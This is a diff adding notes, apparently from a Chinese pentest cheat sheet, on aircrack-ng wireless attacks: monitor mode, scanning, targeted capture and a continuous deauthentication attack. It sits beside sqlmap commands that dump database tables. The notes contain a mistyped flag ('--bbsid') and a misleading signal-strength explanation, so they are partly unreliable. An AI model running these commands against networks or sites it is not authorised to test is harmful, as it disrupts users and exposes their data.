@@ -133,3 +133,42 @@ sqlmap -u "url" --cookie="cookie" -D database -T table --columns
 sqlmap -u "url" --cookie="cookie" -D database -T table -C col1,col2 --dump
 ```
 
+
+
+# aircrack-ng
+
+查看无线网卡信息
+
+```bash
+airmon-ng
+```
+开启网卡监听模式
+
+```bash
+airmon-ng start wlan0
+```
+使用airodump-ng 扫描信号
+
+```bash
+airodump-ng wlan0mon
+```
+|符号|意义|
+|------|------|
+| BSSID | AP端的MAC地址 |
+| PWR   | 信号强度，数字越小越好 |
+| \#Data | 对应的路由器的在线数据吞吐量，数字越大，数据上传量越大 |
+| CH | 对应路由器的所在频道 |
+| ESSID | 对应路由器的名称 |
+
+使用airodump-ng 监听指定目标频道
+
+```bash
+airodump-ng -c <ch> -w /path/to/file --bbsid <bbsid> wlan0mon
+```
+
+使用aireplay-ng 进行解除认证攻击模式
+
+```bash
+aireplay-ng -0 0 -a <AP MAC address> -c <client address> wlan0mon
+```
+
